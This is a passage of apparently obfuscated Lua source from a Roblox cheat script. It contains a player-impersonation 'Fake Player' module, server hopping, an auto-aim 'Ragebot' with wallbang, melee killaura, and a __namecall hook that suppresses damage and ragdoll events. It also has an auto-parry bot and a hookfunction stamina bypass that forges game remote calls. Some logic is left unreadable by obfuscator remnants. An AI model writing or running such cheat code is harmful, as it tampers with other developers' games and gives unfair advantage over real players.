						if not arg2 or not arg3 then
							return false
						end

						local ok4, result4 = pcall(function()
							return Players:GetCharacterAppearanceAsync(arg)
						end)

						local ok5, result5 = pcall(function()
							return Players:GetHumanoidDescriptionFromUserIdAsync(arg)
						end)

						arg3.DisplayName = displayName

						if ok5 and result5 then
							if not pcall(function()
								arg3:ApplyDescriptionClientServer(result5)
							end) then
								pcall(function()
									arg3:ApplyDescription(result5)
								end)
							end
						end

						fn58(arg2)

						if ok4 and result4 then
							fn59(arg2, result4)
						end

						local parent = arg2.Parent
						arg2.Parent = nil
						arg2.Parent = parent
						return true
					end

					local function fn61()
						if tbl7.CharacterAdded then
							Disconnect(tbl7.CharacterAdded)
							tbl7.CharacterAdded = nil
						end
					end

					local function fn62()
						if typeof(window._playerListRefreshFakeButtons) == "function" then
							window:_playerListRefreshFakeButtons()
						end
					end

					local function fn63(fakePlayerTargetUserId, arg, arg2)
						fn55()
						fn61()
						tbl7.Target = { UserId = fakePlayerTargetUserId, Username = arg, DisplayName = arg2 }
						window._fakePlayerTargetUserId = fakePlayerTargetUserId
						local character = LocalPlayer.Character
						local humanoid2 = character and FindFirstChildOfClass(character, "Humanoid")

						if character and humanoid2 then
							fn60(fakePlayerTargetUserId, arg2, character, humanoid2)
						end

						pcall(function()
							Players:SetLocalPlayerInfo(fakePlayerTargetUserId, arg, arg2, "None", false)
						end)

						tbl7.CharacterAdded = Connect(LocalPlayer.CharacterAdded, function(arg3)
							local target = tbl7.Target
							if not target then
								return
							end
							local humanoid = arg3:WaitForChild("Humanoid", 10)

							if humanoid then
								fn60(target.UserId, target.DisplayName, arg3, humanoid)
							end
						end)

						fn62()
					end

					local function fn64()
						local original = tbl7.Original

						if not original then
							window._fakePlayerTargetUserId = nil
							fn62()
							return false
						end

						fn61()
						tbl7.Target = nil
						window._fakePlayerTargetUserId = nil
						local character = LocalPlayer.Character
						local humanoid = character and FindFirstChildOfClass(character, "Humanoid")

						if character and humanoid then
							fn60(original.UserId, original.DisplayName, character, humanoid)
						end

						pcall(function()
							Players:SetLocalPlayerInfo(
								original.UserId,
								original.Username,
								original.DisplayName,
								original.Membership or "None",
								original.HasVerifiedBadge == true
							)
						end)

						fn62()
						return true
					end

					window.ApplyFakePlayer = function(arg, arg2)
						if tbl7.Busy then
							return
						end
						tbl7.Busy = true

						Spawn(function()
							local ok4, result4 = pcall(function()
								local v10 = fn56(arg2)
								if not v10 then
									window:Notify({ Title = "Fake Player", Content = "Invalid user", Duration = 2 })
									return
								end
								local v11 = fn55()

								if v11 and v11.UserId == v10 then
									fn64()
									window:Notify({ Title = "Fake Player", Content = "Restored", Duration = 2 })
									return
								end

								local v12, v13 = fn57(v10)
								if not v12 then
									window:Notify({ Title = "Fake Player", Content = "User not found", Duration = 2 })
									return
								end
								fn63(v10, v12, v13)

								window:Notify({
									Title = "Fake Player",
									Content = v13 .. " (@" .. v12 .. ")",
									Duration = 2.5,
								})
							end)

							tbl7.Busy = false

							if not ok4 then
								window:Notify({ Title = "Fake Player", Content = tostring(result4), Duration = 2.5 })
							end
						end)
					end

					window.RestoreFakePlayer = function()
						if tbl7.Busy then
							return
						end
						tbl7.Busy = true

						Spawn(function()
							local ok4, result4 = pcall(function()
								if not fn64() then
									window:Notify({ Title = "Fake Player", Content = "Not faking", Duration = 2 })
									return
								end
								window:Notify({ Title = "Fake Player", Content = "Restored", Duration = 2 })
							end)

							tbl7.Busy = false

							if not ok4 then
								window:Notify({ Title = "Fake Player", Content = tostring(result4), Duration = 2.5 })
							end
						end)
					end

					local fakePlayer = misc:CreateModule({ Id = "misc-fake-player", Name = "Fake Player" })

					fakePlayer:CreateInput({
						Id = "misc-fake-player-input",
						Name = "UserId / Username",
						Placeholder = "UserId / Username",
						Callback = function(arg)
							local flag = typeof(arg) == "string" and arg

							if not flag then
								flag = tostring(arg or "")
							end

							tbl7.Input = string.gsub(string.gsub(flag, "^%s+", ""), "%s+$", "")
						end,
					})

					fakePlayer:CreateButton({
						Id = "misc-fake-player-apply",
						Name = "Fake",
						Callback = function()
							window:ApplyFakePlayer(tbl7.Input)
						end,
					})

					fakePlayer:CreateButton({
						Id = "misc-fake-player-restore",
						Name = "Restore",
						Callback = function()
							window:RestoreFakePlayer()
						end,
					})

					local random = NewRandom()

					local function fn65(arg)
						if type(arg) ~= "table" then
							return nil
						end
						local id = arg.id
						if not id or id == game.JobId then
							return nil
						end
						local n4 = tonumber(arg.playing) or 0
						local n5 = tonumber(arg.maxPlayers) or 0
						if n5 <= 0 or n4 >= n5 then
							return nil
						end
						return id
					end

					local function fn66(arg)
						if arg == "Rejoin" then
							if
								not pcall(function()
									TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
								end)
							then
								pcall(function()
									TeleportService:Teleport(game.PlaceId, LocalPlayer)
								end)
							end

							return
						end

						local str3 = arg == "Most" and "Desc" or "Asc"
						local flag = arg == "Random"
						local tbl8 = {}
						local str4 = nil

						for i = 1, 8 do
							local format = Format
							local placeId = game.PlaceId
							str4 = str4 and "&cursor=" .. HttpService:UrlEncode(str4) or ""

							local v10 = format(
								"https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&limit=100%s",
								placeId,
								str3,
								str4
							)

							local ok4, result4 = pcall(function()
								return game:HttpGet(v10)
							end)

							if not ok4 or not result4 then
								window:Island("Server hop failed", 1.5)
								return
							end

							local ok5, result5 = pcall(function()
								return HttpService:JSONDecode(result4)
							end)

							if not ok5 or type(result5) ~= "table" then
								window:Island("Server data failed", 1.5)
								return
							end
							local data3 = result5.data

							if type(data3) == "table" then
								for i2 = 1, #data3 do
									local v11 = fn65(data3[i2])

									if v11 then
										if flag then
											Insert(tbl8, v11)
											continue
										end

										if
											not pcall(function()
												TeleportService:TeleportToPlaceInstance(game.PlaceId, v11, LocalPlayer)
											end)
										then
											window:Island("Teleport failed", 1.5)
										end

										return
									end
								end
							end

							str4 = result5.nextPageCursor
							if not str4 then
								break
							end
						end

						if flag and #tbl8 > 0 then
							local v10 = tbl8[random:NextInteger(1, #tbl8)]

							if
								not pcall(function()
									TeleportService:TeleportToPlaceInstance(game.PlaceId, v10, LocalPlayer)
								end)
							then
								window:Island("Teleport failed", 1.5)
							end

							return
						end

						window:Island("No server found", 1.5)
					end

					local serverHop = misc:CreateModule({ Id = "misc-server-hop", Name = "Server Hop" })

					serverHop:CreateButton({
						Id = "ServerHopModule.Rejoin",
						Name = "Rejoin",
						Callback = function()
							fn66("Rejoin")
						end,
					})

					serverHop:CreateButton({
						Id = "ServerHopModule.Low",
						Name = "Low",
						Callback = function()
							fn66("Low")
						end,
					})

					serverHop:CreateButton({
						Id = "ServerHopModule.Most",
						Name = "Most",
						Callback = function()
							fn66("Most")
						end,
					})

					serverHop:CreateButton({
						Id = "ServerHopModule.Random",
						Name = "Random",
						Callback = function()
							fn66("Random")
						end,
					})

					serverHop:CreateButton({
						Id = "ServerHopModule.CopyJoinScript",
						Name = "Copy Join Script",
						Callback = function()
							pcall(
								setclipboard,
								"game:GetService('TeleportService'):TeleportToPlaceInstance("
									.. game.PlaceId
									.. ", '"
									.. game.JobId
									.. "', game:GetService('Players').LocalPlayer)"
							)
						end,
					})

					local settings = window:CreateTab({ Id = "tab-settings", Name = "Settings" })
					window:CreateConfigSystem({ Title = "Config", Default = autoloadcfg or "" })

					loadcfg = function(arg)
						local selectedConfig = arg or window._selectedConfig

						if selectedConfig and selectedConfig ~= "" then
							local v10 = window:LoadConfig(selectedConfig)

							if v10 then
								window._selectedConfig = selectedConfig

								if window._refreshConfigList then
									window._refreshConfigList()
								end

								window:Notify({ Title = "Loaded", Content = "Config loaded!", Duration = 2 })
							end

							return v10
						end

						return false
					end

					local tbl8 = {
						HitSound = {
							Module = nil,
							Enabled = true,
							Sound = "Neverlose",
							Sounds = {
								Neverlose = "6607204501",
								Gamesense = "5633695679",
								Fatality = "6607142036",
								Criminality = "160432334",
								Minecraft = "7151570575",
							},
						},
						ResolveCache = { Module = nil, Params = NewRayParams() },
					}

					tbl8.ResolveCache.Params.FilterType = Enum.RaycastFilterType.Exclude

					tbl8.HitSound.Module =
						settings:CreateModule({ Id = "settings-hit-sound", Name = "Hit Sound", Default = true })

					tbl8.HitSound.Module:CreateSelector({
						Id = "SettingsState.HitSound.Sound",
						Name = "Sound",
						Options = {
							{ Value = "Neverlose" },
							{ Value = "Gamesense" },
							{ Value = "Fatality" },
							{ Value = "Criminality" },
							{ Value = "Minecraft" },
						},
						Default = tbl8.HitSound.Sound,
						Callback = function(sound)
							tbl8.HitSound.Sound = sound
						end,
					})

					tbl8.ResolveCache.Module =
						settings:CreateModule({ Id = "settings-resolve-cache", Name = "Resolve Cache", Default = true })

					CreateHitSound = function()
						if not tbl8.HitSound.Module:Get() then
							return
						end
						local Sound = NewInstance("Sound", Camera())
						Sound.SoundId = "rbxassetid://" .. tbl8.HitSound.Sounds[tbl8.HitSound.Sound]
						Sound.Volume = 1
						Sound:Play()
						Debris:AddItem(Sound, 1)
					end

					local function fn67(arg)
						local unit = arg:Cross(Abs(arg.Y) < 0.9 and Vector3.new(0, 1, 0) or Vector3.new(1, 0, 0)).Unit
						return arg, unit, arg:Cross(unit).Unit
					end

					Resolve = function(arg, arg2, arg3, arg4, arg5, arg6, arg7)
						local params = tbl8.ResolveCache.Params
						local position = arg.Position
						local position2 = arg2.Position
						local n4 = Abs(arg3 or 0)
						local n5 = Abs(arg4 or 0)
						arg5 = arg5 or math.huge
						local n6 = n4 + n5
						local n7 = n6 > 0 and Min(1, arg5 / n6) or 0
						local n8 = n4 * n7
						local n9 = n5 * n7

						local function fn68(arg8, arg9, arg10)
							if not tbl8.ResolveCache.Module:Get() then
								return
							end
							local n10 = arg9 - arg8
							if n10.Magnitude < 0.1 then
								return
							end
							local hit = RaycastWorkspace(arg8, n10, arg10)
							return not hit or (hit.Position - position2).Magnitude <= n9
						end

						local filterDescendantsInstances = {}

						if LocalPlayer.Character then
							Insert(filterDescendantsInstances, LocalPlayer.Character)
						end

						if arg.Parent then
							Insert(filterDescendantsInstances, arg.Parent)
						end

						if arg2.Parent then
							Insert(filterDescendantsInstances, arg2.Parent)
						end

						if arg7 and typeof(arg7) == "table" then
							for _, v10 in arg7, nil, nil do
								Insert(filterDescendantsInstances, v10)
							end
						end

						params.FilterDescendantsInstances = filterDescendantsInstances
						local n10 = position2 - position
						if n10.Magnitude < 0.1 then
							return
						end
						local v10, v11, v12 = fn67(n10.Unit)
						local hit = RaycastWorkspace(position, n10, params)
						if not hit or (hit.Position - position2).Magnitude <= n9 then
							return position, position2, true
						end
						local tbl9 = { v12, -v12, -v11, v11 }

						for i = 1, #tbl9 do
							local n11 = position + tbl9[i] * n8
							if fn68(n11, position2, params) then
								return n11, position2, true
							end
						end
					end

					PlayerList = window:CreatePlayerList({
						Title = "Player List",
						SearchPlaceholder = "Search player...",
						BlacklistText = "Blacklist",
						WhitelistText = "Whitelist",
						StateChanged = function(arg)
							if arg.State == "Blacklist" then
								print("Blacklisted:", arg.Player.Name)
							elseif arg.State == "Whitelist" then
								print("Whitelisted:", arg.Player.Name)
							else
								print("Cleared state for:", arg.Player.Name)
							end

							pcall(ohioStartTargetWorker)
						end,
					})

					CheckState = function(arg)
						local state_, v10 = PlayerList:GetState(arg)
						if state_ == "Whitelist" then
							return false
						end

						if state_ == "Blacklist" then
							return true
						end
						return not v10
					end

					GetClosest = function()
						local tbl9 = {}
						local tbl10 = {}
						if not Camera() then
							return tbl9
						end
						local mouseLocation = MouseLocation()
						local players = GetPlayerList()

						for i = 1, #players do
							local v10 = players[i]
							local character = v10.Character
							local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")

							if not (v10 == LocalPlayer or not character or not humanoidRootPart) then
								local v11, v12 = WorldToViewport(humanoidRootPart.Position)

								Insert(
									tbl10,
									{ plr = v10, dist = Floor((mouseLocation - NewVector2(v11, v12)).Magnitude) }
								)
							end
						end

						Sort(tbl10, function(arg, arg2)
							return arg.dist < arg2.dist
						end)

						for i = 1, #tbl10 do
							Insert(tbl9, tbl10[i].plr)
						end

						return tbl9
					end

					isdeath = function(arg)
						if not arg then
							return true
						end

						if Sub(tostring(Floor(arg.Health)), 1, 1) == "0" then
							return true
						end
						return false
					end

					isPartVisible = function(arg, arg2)
						if not arg or not arg2 then
							return false
						end
						local v10, v11, v12, v13 = WorldToViewport(arg.Position)
						if not v13 then
							return false
						end
						local size = arg.Size
						local cFrame = arg.CFrame
						local n4 = size.X / 2
						local n5 = size.Y / 2
						local n6 = size.Z / 2
						local tbl9 = {}
						local n7 = cFrame * NewCFrame(n4, n5, n6)
						local n8 = cFrame * NewCFrame(n4, n5, -n6)
						local n9 = cFrame * NewCFrame(n4, -n5, n6)
						local n10 = cFrame * NewCFrame(n4, -n5, -n6)
						local n11 = cFrame * NewCFrame(-n4, n5, n6)
						local n12 = cFrame * NewCFrame(-n4, n5, -n6)
						local n13 = cFrame * NewCFrame(-n4, -n5, n6)
						local n14 = cFrame * NewCFrame(-n4, -n5, -n6)
						tbl9[1] = n7
						tbl9[2] = n8
						tbl9[3] = n9
						tbl9[4] = n10
						tbl9[5] = n11
						tbl9[6] = n12
						tbl9[7] = n13
						tbl9[8] = n14
						local filterDescendantsInstances = {}
						local character = GetLocalCharacter()

						if character then
							filterDescendantsInstances[#filterDescendantsInstances + 1] = character
						end

						local model = FindFirstAncestorOfClass(arg, "Model")

						if model and FindFirstChildOfClass(model, "Humanoid") then
							local children = GetChildren(model)

							for i = 1, #children do
								local v14 = children[i]

								if IsA(v14, "Accessory") then
									filterDescendantsInstances[#filterDescendantsInstances + 1] = v14
								end
							end
						end

						local raycastParams = NewRayParams()
						raycastParams.FilterDescendantsInstances = filterDescendantsInstances
						raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
						raycastParams.IgnoreWater = true

						for i = 1, #tbl9 do
							local position = tbl9[i].Position

							local hit = RaycastWorkspace(
								arg2,
								(position - arg2).Unit * (position - arg2).Magnitude,
								raycastParams
							)

							if not hit or hit.Instance == arg or IsAncestorOf(arg, hit.Instance) then
								return true
							end
						end

						local position = arg.Position

						local hit =
							RaycastWorkspace(arg2, (position - arg2).Unit * (position - arg2).Magnitude, raycastParams)

						if not hit or hit.Instance == arg or IsAncestorOf(arg, hit.Instance) then
							return true
						end
						return false
					end

					window:CreateTab({ Id = "tab-themes", Name = "Themes", Key = "tab_themes", Kind = "Themes" })

					local handlers = {
						Blackout = function()
							local flag = false
							local flag2 = false
							local flag3 = false
							local flag4 = false
							local flag5 = false
							local flag6 = false
							local flag7 = false

							local function fn68(arg)
								local gunStatus = arg and FindFirstChild(arg, "GunStatus")
								if not gunStatus then
									return 0.1
								end
								local chars = FindFirstChild(workspace, "Chars")
								chars = chars and FindFirstChild(chars, LocalPlayer.Name)
								chars = chars and FindFirstChild(chars, "ServerGunModel")
								chars = chars and FindFirstChild(chars, "Settings")
								local result4 = nil

								if chars then
									local ok4
									ok4, result4 = pcall(require, chars)
									ok4 = ok4 and type(result4) == "table"
									local v10 = nil

									if not ok4 then
										result4 = v10
									end
								end

								local firing = result4 and result4.Firing
								result4 = result4 and result4.Modes
								local mode = GetAttribute(gunStatus, "Mode")
								local rpm = result4 and result4[mode]

								if not rpm and result4 then
									for i = 1, #result4 do
										local v10 = result4[i]
										if v10.Name == mode then
											rpm = v10
											break
										end
									end
								end

								rpm = rpm and rpm.RPM or firing and firing.RPM or 600
								firing = firing and firing.RPM or 1
								local ok4, result5 = pcall(require, ReplicatedStorage.Mods.StatusEffectDatabase.Shared)
								ok4 = ok4 and type(result5) == "table" and result5.GetScaledStats
								local n4 = 1

								if ok4 then
									local v10 = result5.GetScaledStats(_G.CharacterStates)

									if type(v10) == "table" and v10.FireRate then
										n4 = v10.FireRate
									end
								end

								return 60 / rpm * firing * n4
							end

							local flag8 = false
							local n4 = 0
							local n5 = 7

							hookmetamethod(game, "__namecall", function(H, ...)
								local m = { ... }

								if getnamecallmethod() == "FireServer" then
									if H.Name == "Damage" then
										if luraph_box(D[1]) then
											if m[1] ~= 1000 then
												return
											end
										end
									elseif H.Name == "Ragdoll" then
										if luraph_box(D[2]) then
											return
										end
									end
								end

								return luraph_box(D[3])(H, ...)
							end)

							local function fn69(arg, arg2, arg3, arg4)
								if arg and arg2 and arg3 and arg3.Parent and arg4 then
									local gunStatus = FindFirstChild(arg4, "GunStatus")

									if gunStatus then
										local magazine = GetAttribute(gunStatus, "Magazine")
										local n6 = Random(1, 1000)

										if magazine > 0 and flag8 == false then
											local position = Camera()
											position = position and position.CFrame.Position or arg2.Position
											local position2 = arg3.Position
											Spawn(CreateTracer, arg2.Position, position2)
											local cframe = CFrame.lookAt(position, position2)

											ReplicatedStorage.GunStorage.Events.Shoot:FireServer(
												cframe.Position,
												cframe,
												1,
												1,
												n6,
												n6
											)

											ReplicatedStorage.GunStorage.Events.H1t_:FireServer(arg3, n6)
											Spawn(CreateHitSound)
										end
									end
								end
							end

							local function fn70(arg)
								if arg then
									local parent = arg.Parent and GetAttribute(arg.Parent, "Focus")
									ReplicatedStorage.MeleeStorage.Events.Swing:InvokeServer()

									ReplicatedStorage.MeleeStorage.Events.Hit:FireServer(
										arg,
										parent or NewVector3(arg.Position.X, arg.Position.Y, arg.Position.Z)
									)

									local now = tick()

									if n5 <= now - n4 then
										n4 = now
										Spawn(CreateHitSound)
										ReplicatedStorage.MeleeStorage.Events.Swing:InvokeServer(true)

										ReplicatedStorage.MeleeStorage.Events.Hit:FireServer(
											arg,
											parent or NewVector3(arg.Position.X, arg.Position.Y, arg.Position.Z)
										)
									end
								end
							end

							local blackout = window:CreateTab({ Id = "blackout", Name = "Blackout" })

							blackout:CreateModule({
								Id = "blackout-melee-killaura",
								Name = "Melee Killaura",
								Callback = function(arg)
									flag3 = arg
								end,
							})

							local ragebot = blackout:CreateModule({
								Id = "blackout-ragebot",
								Name = "Ragebot",
								Callback = function(arg)
									flag4 = arg
								end,
							})

							ragebot:CreateToggle({
								Id = "blackout_ragebot_wallbang",
								Name = "Wallbang",
								Default = false,
								Callback = function(arg)
									flag5 = arg
								end,
							})

							ragebot:CreateToggle({
								Id = "blackout_ragebot_ignore_npc",
								Name = "Ignore NPC",
								Default = false,
								Callback = function(arg)
									flag6 = arg
								end,
							})

							blackout:CreateModule({
								Id = "blackout-auto-skip-shop",
								Name = "Auto Skip Shop",
								Callback = function(arg)
									flag7 = arg
								end,
							})

							blackout:CreateModule({
								Id = "blackout-no-fall-damage",
								Name = "No Fall Damage",
								Callback = function(arg)
									flag = arg
								end,
							})

							blackout:CreateModule({
								Id = "blackout-no-ragdoll",
								Name = "No Ragdoll",
								Callback = function(arg)
									flag2 = arg
								end,
							})

							Connect(RunService.Heartbeat, function(H)
								for m in next, D[1], nil do
									D[1][m] = D[1][m] + H
								end

								if luraph_box(D[2]) or luraph_box(D[3]) then
									H = LocalPlayer.Character
									local m = H and (FindFirstChild(H, "HumanoidRootPart"))

									if H and m then
										local h, B = {}, GetClosest()

										for t = 1, #B, 1 do
											local x = B[t]
											if not CheckState(x) then
												continue
											end
											t = x.Character

											local R, O, k =
												t and (FindFirstChildOfClass(t, "Humanoid")),
												t and (FindFirstChild(t, "Head")),
												t and (FindFirstChild(t, "HumanoidRootPart"))

											local j = k and (k.Position - m.Position).Magnitude

											if t and R and O and k and j and R.Health > 0 then
												local i, z = FindFirstChild(t, "Torso"), FindFirstChild(t, "UpperTorso")

												if
													i and (FindFirstChildOfClass(i, "ForceField"))
													or z and (FindFirstChildOfClass(z, "ForceField"))
													or k and (FindFirstChildOfClass(k, "ForceField"))
												then
													continue
												end

												Insert(h, { plr = x, char = t, hum = R, head = O, hrp = k, dist = j })
											end
										end

										for t = 1, #h, 1 do
											B = h[t]
											local h, x = B.head, B.dist

											if luraph_box(D[2]) and x <= 15 then
												D[4](h)
											end

											if luraph_box(D[3]) and x <= 2000 then
												t = FindFirstChildOfClass(H, "RayValue")
												local B = t and (FindFirstChild(t, "GunStatus"))

												if t and B and D[1].ragebot >= luraph_box(D[5])(t) then
													local x, R =
														GetAttribute(B, "Magazine"), GetAttribute(B, "MagazineCapacity")

													if x == R then
														local __boxv0 = false
														luraph_box_set(D[6], __boxv0)
													end

													if x < 1 and luraph_box(D[6]) == false then
														luraph_box(D[7])("Ragebot", "Reload")
														local __boxv0 = true
														luraph_box_set(D[6], __boxv0)
														ReplicatedStorage.GunStorage.Events.Reload:InvokeServer()
														ReplicatedStorage.GunStorage.Events.Action:FireServer("MagHit")
													elseif x > 0 and luraph_box(D[6]) == false then
														if
															if not luraph_box(D[8])
																then (isPartVisible(h, H.Head.Position))
																else true
														then
															D[1].ragebot = 0
															D[9](H, m, h, t)
															break
														end
													end
												end
											end
										end
									end
								end

								if luraph_box(D[2]) or luraph_box(D[3]) then
									H = LocalPlayer.Character
									local m = H and (FindFirstChild(H, "HumanoidRootPart"))

									if H and m then
										local h, B = {}, workspace.NPCs

										local t, x =
											B and (FindFirstChild(B, "Custom")), B and (FindFirstChild(B, "Hostile"))

										if t then
											for R, R in GetChildren(t) do
												Insert(h, R)
											end
										end

										if x then
											for R, R in GetChildren(x) do
												Insert(h, R)
											end
										end

										if #h > 0 then
											for R, O in h, nil, nil do
												B, R = FindFirstChild(O, "Humanoid"), FindFirstChild(O, "Head")

												if B and not isdeath(B) and R then
													x = (m.Position - R.Position).Magnitude

													if luraph_box(D[2]) and x <= 15 then
														D[4](R)
													end

													if luraph_box(D[3]) and not luraph_box(D[10]) and x <= 2000 then
														t = FindFirstChildOfClass(H, "RayValue")
														O = t and (FindFirstChild(t, "GunStatus"))

														if t and O and D[1].ragebot >= luraph_box(D[5])(t) then
															local h, B =
																GetAttribute(O, "Magazine"),
																GetAttribute(O, "MagazineCapacity")

															if h == B then
																local __boxv0 = false
																luraph_box_set(D[6], __boxv0)
															end

															if h < 1 and luraph_box(D[6]) == false then
																luraph_box(D[7])("Ragebot", "Reload")
																local __boxv0 = true
																luraph_box_set(D[6], __boxv0)
																ReplicatedStorage.GunStorage.Events.Reload:InvokeServer()

																ReplicatedStorage.GunStorage.Events.Action:FireServer(
																	"MagHit"
																)
															elseif h > 0 and luraph_box(D[6]) == false then
																if
																	if not luraph_box(D[8])
																		then (isPartVisible(R, H.Head.Position))
																		else true
																then
																	D[1].ragebot = 0
																	D[9](H, m, R, t)
																	break
																end
															end
														end
													end
												end
											end
										end
									end
								end

								if luraph_box(D[11]) and D[1].skipshop >= 1 then
									D[1].skipshop = 0
									ReplicatedStorage.Events.NB.SkipShop:FireServer(true)
								end
							end)
						end,
						["Blade Ball"] = function()
							local VirtualInputManager = GetService("VirtualInputManager")
							local balls = FindFirstChild(Workspace, "Balls")
							local alive = FindFirstChild(Workspace, "Alive")

							local tbl9 =
								{ Enabled = false, ParryWindow = 0.12, TargetClosestSpam = 15, Connection = nil }

							local function fn68()
								if not balls then
									return nil
								end
								local children = GetChildren(balls)

								for i = 1, #children do
									local v10 = children[i]
									if GetAttribute(v10, "realBall") == true then
										return v10
									end
								end
							end

							local function fn69(arg)
								if not arg then
									return nil
								end

								if IsA(arg, "BasePart") then
									return arg.Position
								end
								local humanoidRootPart = FindFirstChild(arg, "HumanoidRootPart")
								if humanoidRootPart and IsA(humanoidRootPart, "BasePart") then
									return humanoidRootPart.Position
								end

								if IsA(arg, "Model") and arg.PrimaryPart then
									return arg.PrimaryPart.Position
								end
							end

							local function fn70(arg)
								if not alive or not arg then
									return nil
								end
								local children = GetChildren(alive)

								for i = 1, #children do
									local v10 = children[i]
									if v10.Name == arg then
										return v10
									end
								end
							end

							local function fn71()
								VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, nil)
							end

							local function fn72()
								local v10 = fn68()
								local character = LocalPlayer.Character
								local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")
								if not v10 or not humanoidRootPart or not IsA(v10, "BasePart") then
									return
								end
								local n4 = humanoidRootPart.Position - v10.Position
								local magnitude = n4.Magnitude
								local target = GetAttribute(v10, "target")

								if target == LocalPlayer.Name then
									local v11 =
										v10.AssemblyLinearVelocity:Dot(magnitude > 0 and n4.Unit or EmptyVector3)

									if v11 > 0 then
										if magnitude / v11 <= tbl9.ParryWindow then
											fn71()
										end
									end

									return
								end

								local v11 = fn70(target)
								local v12 = fn69(v11)

								if v12 and (v12 - humanoidRootPart.Position).Magnitude <= tbl9.TargetClosestSpam then
									fn71()
								end
							end

							local autoParry =
								window:CreateTab({ Id = "blade-ball", Name = "Blade Ball" }):CreateModule({
									Id = "blade-ball-auto-parry",
									Name = "Auto Parry",
									Callback = function(enabled)
										tbl9.Enabled = enabled

										if tbl9.Connection then
											Disconnect(tbl9.Connection)
											tbl9.Connection = nil
										end

										if enabled then
											tbl9.Connection = Connect(Heartbeat, fn72)
										end
									end,
								})

							autoParry:CreateSlider({
								Id = "blade-ball-parry-window",
								Name = "Parry Window",
								Min = 0.01,
								Max = 0.5,
								Default = tbl9.ParryWindow,
								Step = 0.01,
								Callback = function(parryWindow)
									tbl9.ParryWindow = parryWindow
								end,
							})

							autoParry:CreateSlider({
								Id = "blade-ball-target-closest-spam",
								Name = "Target Closest Spam",
								Min = 1,
								Max = 100,
								Default = tbl9.TargetClosestSpam,
								Step = 1,
								Callback = function(targetClosestSpam)
									tbl9.TargetClosestSpam = targetClosestSpam
								end,
							})
						end,
						["Block Spin"] = function()
							local Sprint = require(ReplicatedStorage.Modules.Game.Sprint)
							local Net = require(ReplicatedStorage.Modules.Core.Net)
							local tbl9 = {}

							local function fn68(arg)
								if tbl9[arg] then
									return tbl9[arg][1], tbl9[arg][2]
								end

								if FindFirstChild(GetService("StarterPack"), arg) then
									local v10 = FindFirstChild(GetService("StarterPack"), arg)
									tbl9[v10.name] = { v10, "Melee" }
									return v10, "Melee"
								end

								local children = GetChildren(ReplicatedStorage.Items)

								for i = 1, #children do
									local v10 = children[i]

									if IsA(v10, "Folder") then
										local children2 = GetChildren(v10)

										for i2 = 1, #children2 do
											local v11 = children2[i2]
											if v11.Name == arg then
												tbl9[v11.name] = { v11, v10 }
												return v11, v10.Name
											end
										end
									end
								end
							end

							local function fn69(arg, arg2, arg3)
								local v10 = fn68(arg.Name)
								local speed = GetAttribute(arg, "Speed") or 1

								if v10 then
									speed = GetAttribute(v10, "Speed") or 1
								end

								Net.send(
									"melee_attack",
									arg,
									arg2,
									arg3.CFrame,
									(speed * 0.75 + Random() * speed * 0.25)
										* (GetAttribute(LocalPlayer, "SpeedMultiplier") or 1)
								)
							end

							local v10 = nil

							window:CreateTab({ Id = "block-spin-rage", Name = "Rage" }):CreateModule({
								Id = "block-spin-melee-aura",
								Name = "Melee Aura",
								Callback = function(arg)
									v10 = arg
									if not arg then
										return
									end

									Spawn(function()
										while v10 and Wait() do
											local character = LocalPlayer.Character

											local humanoidRootPart = character
												and FindFirstChild(character, "HumanoidRootPart")

											if not (not character or not humanoidRootPart) then
												local tool = FindFirstChildOfClass(character, "Tool")

												if tool then
													local v11, v12 = fn68(tool.Name)

													if not (not v11 or v12 ~= "Melee") then
														local range = GetAttribute(tool, "Range") or 6

														if v11 then
															range = GetAttribute(v11, "Range") or 6
														end

														local n4 = range + 3
														local tbl10 = {}
														local v13 = GetClosest()

														for i = 1, #v13 do
															local v14 = v13[i]

															if CheckState(v14) then
																local character2 = v14.Character

																local magnitude = character2
																	and FindFirstChild(character2, "HumanoidRootPart")

																magnitude = magnitude
																	and (magnitude.Position - humanoidRootPart.Position).Magnitude

																if magnitude and magnitude <= n4 then
																	Insert(tbl10, v14)
																end
															end
														end

														if #tbl10 > 0 then
															fn69(tool, tbl10, humanoidRootPart)
														end
													end
												end
											end
										end
									end)
								end,
							})

							local move = window:CreateTab({ Id = "block-spin-move", Name = "Move" })

							move:CreateModule({
								Id = "block-spin-fast-stamina-regen",
								Name = "Fast Stamina Regen",
								Callback = function(arg)
									SetAttribute(LocalPlayer, "StaminaRegen", 2)

									if arg then
										SetAttribute(LocalPlayer, "StaminaRegen", 999)
									end
								end,
							})

							local flag = false
							local v11 = nil
							local v12 = hookfunction
							local consumeStamina = Sprint.consume_stamina

							local v13 = luraph_runtime1(function(...)
								if flag then
									return true
								end
								return v11(...)
							end)

							v11 = v12(consumeStamina, v13)

							move:CreateModule({
								Id = "block-spin-bypass-jump-check",
								Name = "Bypass Jump Check",
								Callback = function(arg)
									flag = arg
								end,
							})
						end,
						Defusal = function()
							local replicatedFirst = ReplicatedFirst
							local replicatedStorage = ReplicatedStorage
							local Variables = require(replicatedFirst.Variables)
							local Ambassador = require(replicatedFirst.Ambassador)

							local function fn68(arg)
								return math.round(arg * 1000) / 1000
							end

							local function fn69(arg)
								local z = arg.Z
								return NewVector3(fn68(arg.X), fn68(arg.Y), fn68(z))
							end

							local function fn70(arg)
								local tbl9 = {}

								for i = 1, 24 do
									arg = arg * 48271 % 2147483647
									local n4 = arg % 62 + 1

									tbl9[i] =
										Sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", n4, n4)
								end

								return "sus_" .. table.concat(tbl9)
							end

							local v10 = nil

							local function fn71()
								if v10 and v10.Parent then
									return v10
								end
								local amongUsSauce = GetAttribute(replicatedStorage, "AmongUsSauce")
								if typeof(amongUsSauce) ~= "number" then
									return nil
								end
								v10 = FindFirstChild(replicatedStorage.Events, fn70(amongUsSauce))
								return v10
							end

							local function fn72()
								return Variables.equipped
							end

							local function fn73()
								local equipped = Variables.equipped
								if not equipped then
									return nil
								end
								local loadout = Variables.loadout
								local match = nil

								if loadout then
									match = tostring(equipped):match("^(%d+)")
									local match2 = tostring(equipped):match("_(%d+)$")
									match = match and loadout[match]

									if not (typeof(match) == "table" and match.GunName) then
